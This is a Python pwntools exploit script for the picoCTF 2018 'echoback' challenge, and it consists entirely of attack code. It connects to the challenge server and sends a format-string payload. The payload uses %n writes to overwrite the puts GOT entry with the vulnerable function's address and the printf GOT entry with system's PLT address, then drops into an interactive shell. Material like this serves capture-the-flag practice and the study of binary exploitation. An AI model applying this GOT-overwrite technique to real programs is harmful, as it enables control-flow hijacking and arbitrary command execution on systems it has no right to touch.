#!/usr/bin/python
from pwn import *

# sh = process('./echoback')
sh = remote('2018shell2.picoctf.com', 37857)

system_PLT = 0x08048460
puts_GOT = 0x804a01c
printf_GOT = 0x804a010

vuln_addr = 0x080485e7

count1 = vuln_addr
count2 = 0
count3 = (0x10000-((count1+count2)%0x10000)) + (system_PLT & 0x0000ffff)
count4 = (0x10000-((count1+count2+count3)%0x10000)) + int(hex(system_PLT+0x100000000)[3:7],16)

print count1
print count2
print count3
print count4

payload = ''

payload += p32(puts_GOT)
payload += 'a'*4
payload += p32(printf_GOT)
payload += p32(printf_GOT+2)
payload += '%{}x'.format(count1-16)
payload += '%7$n'
payload += '%{}x'.format(count3)
payload += '%9$n'
payload += '%{}x'.format(count4)
payload += '%10$n'

pause()
sh.sendlineafter(':\n', payload)

sh.interactive()
